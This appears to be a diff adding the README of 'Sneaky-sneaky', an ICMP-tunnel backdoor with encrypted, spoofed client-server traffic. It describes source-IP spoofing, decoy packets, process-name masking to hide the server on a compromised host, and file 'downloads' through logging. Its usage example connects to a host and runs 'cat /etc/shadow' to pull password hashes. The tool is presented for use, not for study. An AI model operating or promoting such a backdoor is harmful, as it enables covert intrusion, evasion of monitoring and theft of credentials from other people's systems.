@@ -1,0 +1,70 @@
+			Sneaky-sneaky
+	
+Icmp tunnel bi-directional spoofed back door, with built in
+encryption and logging.
+
+Communication:-
+Sneaky-sneaky communicates in echo reply's, which the kernel ignores
+and are not normally blocked.
+The packets the client and server send are spoofed, the real ip 
+is encrypted inside the payload, sneaky-sneaky uses this ip 
+to communicate, the "visible" source ip is never used
+
+Spoofing:-
+In this version sneaky has 3 forms of (bi-directional)spoofing. 
+
+	1) fixed - a source ip that stays fixed with every packet
+	2) random - a random source ip for every packet
+	3) list - sneaky spoofs randomly from a list of ips
+
+Decoys:-
+With each packet sent, sneaky-sneaky can send an amount of decoys randomly
+delayed, decoys use the same style spoofing as specified for sneaky.
+
+Download:-
+Sneaky can logs all output from the server so it can be used to 
+"download" files. There is a limit of 4069b for transfers.
+
+eg ./sneaky -i 1.1.1.1 -l shadow.txt
+cat /etc/shadow
+
+Educated proc masking:-
+Sneakyd scans though the proc looking for 
+process names then randomly picks one and hides as it. Fixed from
+last version.
+
+Timeout:- 
+If you get a timeout then try re-sending the packet.
+If this doesn't work then either the server isn't running on that host or you
+have a bad password.
+
+Commands:-
+clear		- works client-side
+cd 		- modified to work over a stateless icmp tunnel
+byebye		- exits client
+astalavista 	- exits client and server
+
+make plain  - plain text communications (testing only!)
+make secure - blowfish encrypted communications
+
+Phish@mindless.com
+www.blakhat.co.uk
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: PGP 6.5.8
+
+mQENAz1hISwAAAEIANAn+nXbKhivPQbUh9wXVR0PTESDdUhq+hsUr9DVgXY4SBss
+cofOKAwVygJUCV5YNDW/l2ObDNVbvBasJvMzvs4lYaCjfNyXJXy+m4TTqFsHhxXV
+zH3Ed+2Oz0yrAF6vr5RNJl8Sach2PxhlteWBtIEzTBe7CO/K93JUDECRYVTMFEPt
+kdn0qYiJPZ2ssgN686UyxJvpr0QO/g3eW1gSIYUSBsG72clZGLfYw1xhe093JFec
+1Ml+p//bcOP2s2Fc+y5B+gaaAcZiumZS0hXHe84IFxg3bNC1fXiYBXO/jAhFr15b
+p6GQCvz9d3b3MfFP/YaUh4YTsZPyKdMscSfVAkMABRG0GlBoaXNoIDxwaGlzaEBt
+aW5kbGVzcy5jb20+iQEVAwUQPWEhLCnTLHEn1QJDAQF9zgf+NM6cZaPuIGjfQJN4
+2PaV2BsBnQvT9Ij/AIHXQZW6CnVVHsYzQ//sEsF6lLlJOhOvPt/338t6N4Vdqj4Y
+08kw1yKEdMTBnKC9/lR2fEHPkj+hNI5yaUDkqKAOFYCmGoVFFLrU4SJ57EBybRw+
+B4O6PVBimZ48JtADh7xEhe6Wyq+jrmzKdNbxPHIaQ9rDUAp7PoI6jqEaL77k6r3p
+MmhXyEvRx9eFNtPag8VCFcSZg1WbLnjDCRchUGdmC3xNrqcvE7Hq5DOujeDcOZtv
+khsf6S1+26VDS28v7BiSH3AMcqgUINZ7gSIesr4OqI6t+Cgby93R5LQT/mdqzDik
+4m472A==
+=awue
+-----END PGP PUBLIC KEY BLOCK-----
